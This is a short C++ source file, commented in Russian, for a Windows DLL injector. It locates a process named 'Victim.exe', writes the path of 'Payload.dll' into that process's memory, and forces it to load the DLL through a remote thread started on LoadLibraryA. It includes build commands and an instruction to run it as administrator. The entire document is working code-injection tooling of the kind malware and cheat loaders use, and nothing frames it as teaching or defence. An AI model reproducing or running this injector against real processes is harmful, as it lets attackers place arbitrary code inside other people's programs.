// Injector.cpp
// MSVC:  cl /EHsc /Fe:Injector.exe Injector.cpp
// MinGW: g++ -O2 -o Injector.exe Injector.cpp
// Запуск: от имени администратора

#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>

static DWORD FindProcessId(const std::string& name)
{
    PROCESSENTRY32 pe{ sizeof(pe) };
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    DWORD pid = 0;

    if (Process32First(snap, &pe))
        do {
            if (_stricmp(pe.szExeFile, name.c_str()) == 0) { pid = pe.th32ProcessID; break; }
        } while (Process32Next(snap, &pe));

    CloseHandle(snap);
    return pid;
}

int main()
{
    DWORD pid = FindProcessId("Victim.exe");
    if (!pid) { std::cerr << "Запустите Victim.exe\n"; return 1; }

    HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
                               PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
    if (!hProc) { std::cerr << "OpenProcess failed\n"; return 1; }

    char dllPath[MAX_PATH]{};
    GetFullPathNameA("Payload.dll", MAX_PATH, dllPath, nullptr);
    SIZE_T size = strlen(dllPath) + 1;

    LPVOID remote = VirtualAllocEx(hProc, nullptr, size,
                                   MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    WriteProcessMemory(hProc, remote, dllPath, size, nullptr);

    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
    auto loadLib = (LPTHREAD_START_ROUTINE)GetProcAddress(hK32, "LoadLibraryA");

    HANDLE hThread = CreateRemoteThread(hProc, nullptr, 0, loadLib, remote, 0, nullptr);
    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(hThread);
    CloseHandle(hProc);

    std::cout << "OK\n";
    return 0;
}